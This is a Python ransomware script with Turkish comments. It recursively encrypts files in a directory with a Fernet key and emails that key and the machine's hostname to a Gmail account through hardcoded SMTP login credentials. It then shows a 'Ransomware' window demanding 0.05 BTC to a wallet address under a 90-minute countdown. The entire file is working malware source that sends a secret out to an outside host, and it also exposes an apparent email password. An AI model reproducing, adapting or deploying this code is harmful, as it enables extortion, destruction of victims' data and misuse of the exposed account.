import os
from cryptography.fernet import Fernet
from pathlib import Path
import tkinter as tk
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import socket

# Dizin yolunu belirtin
directory = './deneme2'


def scanRecurse(baseDir):
    '''
    Bir dizini tarayın ve tüm dosyaların bir listesini döndürün
    return: dosyaların bir listesi
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


try:
    with open('key.txt', 'r') as f:
        key = f.read()
        key = key.decode()
except:
    key = Fernet.generate_key()

    with open('key.txt', 'wb') as keyTxt:
        keyTxt.write(key)


fernet = Fernet(key)


# Gmail email sunucusuna bağlanıyoruz
try:
    name = socket.gethostname()
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login("akin602000@gmail.com", "fzxehssnmcpiftso")

    mesaj = MIMEMultipart()
    mesaj["From"] = "akin602000@gmail.com"           # Gönderen
    mesaj["Subject"] = name    # Konusu
    mesaj["To"] = "akin602000@gmail.com"

    body = str(key)

    body_text = MIMEText(body, "plain")  #
    mesaj.attach(body_text)

    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
    mail.close()

# Eğer mesaj gönderirken hata olursa, hata mesajını konsole yazdırıyorum.
except:
    print("Hata:", sys.exc_info()[0])


def encrypt_file(filename):
    with open(filename, 'rb') as f:
        plaintext = f.read()

    # Dosyayı şifreleyin
    ciphertext = fernet.encrypt(plaintext)

    # Şifrelenmiş dosyayı kaydedin
    with open(filename, 'wb') as f:
        f.write(ciphertext)


excludeExtension = ['.py', '.exe']
for filename in scanRecurse(directory):
    filePath = Path(filename)
    fileType = filePath.suffix.lower()
    if fileType in excludeExtension:
        continue
    encrypt_file(filename)


def countdown(count):
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # her bir saniyeden sonra tekrardan countdown ı çağır (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))


root = tk.Tk()
root.title('Ransomware')
root.geometry('600x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data is under rest\n\n Send 0.05 BTC to this crypto wallet for take back your files.\n 0x81B94C343661fbE735d2560c8190241f9958e94d\n', font=(
    'calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='white', bg='blue')
label.pack()

# countdown u çağırıyoruz
countdown('01:30:00')
# root.after(0, countdown, 5)
root.mainloop()
